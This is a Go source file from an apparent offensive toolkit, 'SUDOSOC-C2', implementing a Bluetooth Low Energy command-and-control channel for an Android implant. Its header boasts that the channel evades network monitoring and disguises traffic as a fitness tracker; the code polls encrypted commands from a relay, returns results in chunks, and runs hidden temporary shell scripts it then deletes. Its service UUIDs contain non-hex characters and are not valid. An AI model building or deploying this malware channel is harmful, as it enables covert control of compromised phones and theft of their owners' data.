// //go:build android

package c2

/*
	SUDOSOC-C2 — Bluetooth Low Energy (BLE) C2 Channel
	Copyright (C) 2026  sudosoc — Seif

	C2 over Bluetooth — works without internet, WiFi, or cellular data.
	The operator carries a BLE peripheral (Raspberry Pi Zero, ESP32, etc.)
	that acts as the C2 relay.

	BLE vs Classic Bluetooth:
	  BLE is preferable:
	  • Lower power consumption (implant stays alive longer)
	  • Longer range in some environments
	  • More difficult to monitor/detect
	  • Standard GATT protocol (normal app behavior)

	Architecture:
	  [Phantom Android Implant] ←── BLE GATT ──→ [Relay Device (ESP32/RPi)]
	                                                        │
	                                                    WiFi/Ethernet
	                                                        │
	                                                  [C2 Server]

	Protocol:
	  Service UUID: deadbeef-face-cafe-1337-c2server0000
	  Characteristics:
	    Command Char (readable):  deadbeef-0001-cafe-1337-c2server0000
	    Result Char (writable):   deadbeef-0002-cafe-1337-c2server0000
	    Status Char (notify):     deadbeef-0003-cafe-1337-c2server0000

	Encryption: AES-256-GCM on all data (BLE itself is not secure enough)

	Range: 10-100 meters (BLE standard)
	With directional antenna: up to 1km

	Detection difficulty:
	  ← BLE scanning requires being near the device
	  ← Traffic looks like any fitness tracker / IoT device
	  ← No network logs anywhere
	  ← Cannot be detected by network security tools
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	// BLE Service and Characteristic UUIDs
	serviceUUID    = "deadbeef-face-cafe-1337-c2server0000"
	cmdCharUUID    = "deadbeef-0001-cafe-1337-c2server0000"
	resultCharUUID = "deadbeef-0002-cafe-1337-c2server0000"
	statusCharUUID = "deadbeef-0003-cafe-1337-c2server0000"

	// BLE MTU (Maximum Transmission Unit) — standard is 20-512 bytes
	bleMTU = 512

	// Scan interval for finding the relay device
	scanInterval = 30 * time.Second
)

// BLEC2 manages Bluetooth C2 communication
type BLEC2 struct {
	RelayName    string  // BLE device name to connect to (e.g., "SudosocRelay")
	RelayMAC     string  // specific MAC address (optional)
	AESKey       []byte  // 32-byte shared secret
	PollInterval time.Duration

	mu          sync.Mutex
	connected   bool
	deviceMAC   string
	cmdBuffer   [][]byte
}

// NewBLEC2 creates a new BLE C2 channel
func NewBLEC2(relayName string, aesKey []byte) *BLEC2 {
	return &BLEC2{
		RelayName:    relayName,
		AESKey:       aesKey,
		PollInterval: 60 * time.Second,
	}
}

// Scan scans for the relay device
func (b *BLEC2) Scan(timeout time.Duration) ([]BLEDevice, error) {
	// Use bluetoothctl or hcitool for BLE scanning
	devices := []BLEDevice{}

	// Method 1: hcitool lescan
	cmd := exec.Command("timeout",
		fmt.Sprintf("%d", int(timeout.Seconds())),
		"hcitool", "lescan")
	out, _ := cmd.Output()

	for _, line := range strings.Split(string(out), "\n") {
		parts := strings.Fields(line)
		if len(parts) >= 2 {
			mac := parts[0]
			name := strings.Join(parts[1:], " ")
			if mac != "LE" && len(mac) == 17 {
				devices = append(devices, BLEDevice{
					MAC:  mac,
					Name: name,
				})
			}
		}
	}

	// Method 2: bluetoothctl
	if len(devices) == 0 {
		devices = b.scanViaBluetoothctl(timeout)
	}

	return devices, nil
}

func (b *BLEC2) scanViaBluetoothctl(timeout time.Duration) []BLEDevice {
	var devices []BLEDevice

	script := fmt.Sprintf(`#!/bin/sh
bluetoothctl power on
bluetoothctl scan on &
sleep %d
bluetoothctl scan off
bluetoothctl devices`, int(timeout.Seconds()))

	tmpScript := "/data/local/tmp/.bt_scan.sh"
	exec.Command("/bin/sh", "-c",
		fmt.Sprintf("echo '%s' > %s && chmod +x %s", script, tmpScript, tmpScript)).Run()

	out, _ := exec.Command(tmpScript).Output()
	exec.Command("rm", tmpScript).Run()

	for _, line := range strings.Split(string(out), "\n") {
		if strings.HasPrefix(line, "Device ") {
			parts := strings.Fields(line)
			if len(parts) >= 3 {
				devices = append(devices, BLEDevice{
					MAC:  parts[1],
					Name: strings.Join(parts[2:], " "),
				})
			}
		}
	}

	return devices
}

// FindRelay finds the relay device by name or MAC
func (b *BLEC2) FindRelay() (*BLEDevice, error) {
	devices, err := b.Scan(10 * time.Second)
	if err != nil {
		return nil, err
	}

	for _, dev := range devices {
		if b.RelayMAC != "" && dev.MAC == b.RelayMAC {
			return &dev, nil
		}
		if strings.Contains(dev.Name, b.RelayName) {
			return &dev, nil
		}
	}
	return nil, fmt.Errorf("relay device '%s' not found", b.RelayName)
}

// PollCommand connects to relay and checks for a new command
func (b *BLEC2) PollCommand() ([]byte, error) {
	relay, err := b.FindRelay()
	if err != nil {
		return nil, err
	}

	// Connect and read the command characteristic
	raw, err := b.gattRead(relay.MAC, cmdCharUUID)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 {
		return nil, nil // no command
	}

	return b.decrypt(raw)
}

// SendResult sends the command result to the relay via BLE
func (b *BLEC2) SendResult(result []byte) error {
	relay, err := b.FindRelay()
	if err != nil {
		return err
	}

	encrypted, err := b.encrypt(result)
	if err != nil {
		return err
	}

	// Split into MTU-sized chunks
	chunks := splitBleMTU(encrypted, bleMTU)
	for i, chunk := range chunks {
		// Add chunk header: [total_chunks][chunk_index][data]
		header := []byte{byte(len(chunks)), byte(i)}
		payload := append(header, chunk...)
		if err := b.gattWrite(relay.MAC, resultCharUUID, payload); err != nil {
			return fmt.Errorf("write chunk %d: %v", i, err)
		}
		time.Sleep(50 * time.Millisecond) // BLE needs time between writes
	}
	return nil
}

// ── GATT Operations via gatttool/bluetoothctl ─────────────────────

func (b *BLEC2) gattRead(mac, charUUID string) ([]byte, error) {
	// gatttool is available on Linux/Android with BlueZ
	out, err := exec.Command("gatttool",
		"-b", mac,
		"--char-read",
		"--uuid="+charUUID).Output()
	if err != nil {
		// Try via bluetoothctl GATT
		return b.gattReadViaBluetoothctl(mac, charUUID)
	}

	// Parse hex output: "Characteristic value/descriptor: xx xx xx ..."
	line := string(out)
	if idx := strings.Index(line, ": "); idx >= 0 {
		hexStr := strings.ReplaceAll(line[idx+2:], " ", "")
		hexStr = strings.TrimSpace(hexStr)
		return hex.DecodeString(hexStr)
	}
	return nil, fmt.Errorf("failed to parse gatttool output")
}

func (b *BLEC2) gattWrite(mac, charUUID string, data []byte) error {
	hexStr := hex.EncodeToString(data)
	// Convert to space-separated hex bytes for gatttool
	var hexParts []string
	for i := 0; i < len(hexStr); i += 2 {
		hexParts = append(hexParts, hexStr[i:i+2])
	}

	args := append([]string{
		"-b", mac,
		"--char-write-req",
		"--uuid=" + charUUID,
		"--value=" + strings.Join(hexParts, ""),
	})

	return exec.Command("gatttool", args...).Run()
}

func (b *BLEC2) gattReadViaBluetoothctl(mac, charUUID string) ([]byte, error) {
	script := fmt.Sprintf(`#!/bin/sh
bluetoothctl connect %s
sleep 2
bluetoothctl gatt.select-attribute %s
bluetoothctl gatt.read`, mac, charUUID)

	tmpScript := "/data/local/tmp/.bt_gatt.sh"
	exec.Command("/bin/sh", "-c",
		fmt.Sprintf("echo '%s' > %s && chmod +x %s", script, tmpScript, tmpScript)).Run()
	out, err := exec.Command(tmpScript).Output()
	exec.Command("rm", tmpScript).Run()

	if err != nil {
		return nil, err
	}

	// Parse output
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "0x") {
			fields := strings.Fields(line)
			var data []byte
			for _, f := range fields {
				if strings.HasPrefix(f, "0x") {
					b, _ := hex.DecodeString(strings.TrimPrefix(f, "0x"))
					data = append(data, b...)
				}
			}
			if len(data) > 0 {
				return data, nil
			}
		}
	}
	return nil, fmt.Errorf("no data from gatt read")
}

// ── Encryption ────────────────────────────────────────────────────

func (b *BLEC2) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(b.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	// Prepend data length (2 bytes) for chunked reassembly
	lengthPrefix := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthPrefix, uint16(len(data)))
	data = append(lengthPrefix, data...)

	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (b *BLEC2) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(b.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	plain, err := gcm.Open(nil, data[:ns], data[ns:], nil)
	if err != nil {
		return nil, err
	}
	if len(plain) < 2 {
		return nil, fmt.Errorf("invalid payload")
	}
	// Skip the 2-byte length prefix
	return plain[2:], nil
}

func splitBleMTU(data []byte, mtu int) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		end := mtu - 2 // 2 bytes for header
		if end > len(data) {
			end = len(data)
		}
		chunks = append(chunks, data[:end])
		data = data[end:]
	}
	return chunks
}

// ── Types ─────────────────────────────────────────────────────────

// BLEDevice represents a discovered BLE device
type BLEDevice struct {
	MAC  string
	Name string
	RSSI int
}
